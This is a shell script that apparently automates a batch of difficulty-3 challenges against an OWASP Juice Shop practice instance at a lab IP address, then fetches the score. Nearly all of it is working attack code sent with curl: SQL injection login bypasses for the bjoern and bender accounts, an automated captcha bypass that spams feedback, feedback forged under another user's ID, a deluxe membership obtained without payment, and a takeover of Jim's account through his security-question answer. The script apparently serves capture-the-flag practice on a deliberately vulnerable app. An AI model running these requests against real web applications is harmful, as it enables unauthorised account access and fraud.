#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.243.253"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "3.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/3-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/3-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/3-cookies.txt"
sed -i 's/\t0\t/\t-1\t/g' "$result_folder/3-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tlanguage\ten" >> $result_folder/3-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tcookieconsent_status\tdismiss" >> $result_folder/3-cookies.txt

# Submit 10 or more customer feedbacks within 10 seconds.
echo "3.4 - CAPTCHA BYPASS"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/3-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/3-bjoern.json)
echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\ttoken\t$BJOERN_TOKEN" >> $result_folder/3-bjoern-cookies.txt
curl -s -X GET http://$target_ip/rest/user/whoami -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-user.json
USER_ID=$(jq -r '.user.id' $result_folder/3-user.json)
echo "--> The user id is $USER_ID"
for i in $(seq 1 10); do
    curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-captcha.json
    CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/3-captcha.json)
    CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/3-captcha.json)
    echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
    curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/3-bjoern-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${BJOERN_TOKEN}"  -d "{\"UserId\":$USER_ID,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}" -o /dev/null
done

# Obtain a Deluxe Membership without paying for it.
echo "3.8 - DELUXE FRAUD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/3-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/3-bjoern.json)
echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\ttoken\t$BJOERN_TOKEN" >> $result_folder/3-bjoern-cookies.txt
curl -s -X POST http://$target_ip/rest/deluxe-membership -b "$result_folder/3-bjoern-cookies.txt" -H "Content-Type: application/json" -d "{\"paymentMode\":\"card\"}" -o $result_folder/3-deluxe.json

# Give a feedback as another user
echo "3.9 - FORGED FEEDBACK"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/3-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/3-bjoern.json)
echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\ttoken\t$BJOERN_TOKEN" >> $result_folder/3-bjoern-cookies.txt
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/3-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/3-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/3-bjoern-cookies.txt" -L -H "Content-Type: application/json" -d "{\"UserId\":2,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}" -o /dev/null


# Log in with Bender's user account.
echo "3.13 - LOGIN BENDER"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"whatever\"}" -o $result_folder/3-bender.json

# Log in with Jim's user account. (He's a start trek fan relating himself to captain kirk)
echo "3.14 - LOGIN JIM"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o $result_folder/3-jim.txt
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"password\":\"test123\"}" -o $result_folder/3-jim.json

# Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.
echo "3.19 - RESET JIM'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o $result_folder/3-jim.txt

# Compute score
echo "3.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/3-cookies.txt" -L -o $result_folder/3-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 3 and .solved == true)] | length' $result_folder/3-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 3 and .solved != null)] | length' $result_folder/3-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"

